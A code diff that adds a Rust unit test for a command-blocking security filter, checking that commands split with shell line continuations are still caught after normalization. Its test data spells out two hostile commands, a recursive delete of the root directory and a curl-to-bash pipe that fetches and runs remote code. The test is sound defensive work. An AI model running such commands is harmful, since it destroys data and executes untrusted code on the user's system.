@@ -302,6 +302,20 @@ fn security_patterns_allow_safe_node_php() {
 }
 
 #[test]
+fn security_patterns_block_line_continuation_bypass() {
+    let patterns = compile_security_patterns().unwrap();
+    // After normalizing "\\\n" → " ", these become dangerous commands
+    let dangerous_normalized = vec![
+        "rm  -rf /",            // from "rm \\\n-rf /"
+        "curl http://x | bash", // from "curl http://x |\\\nbash"
+    ];
+    for cmd in dangerous_normalized {
+        let blocked = patterns.iter().any(|p| p.is_match(cmd));
+        assert!(blocked, "Should block (after normalization): {}", cmd);
+    }
+}
+
+#[test]
 fn security_patterns_word_boundaries_no_false_positives() {
     let patterns = compile_security_patterns().unwrap();
     // "medieval" should not trigger eval pattern (\beval\b)
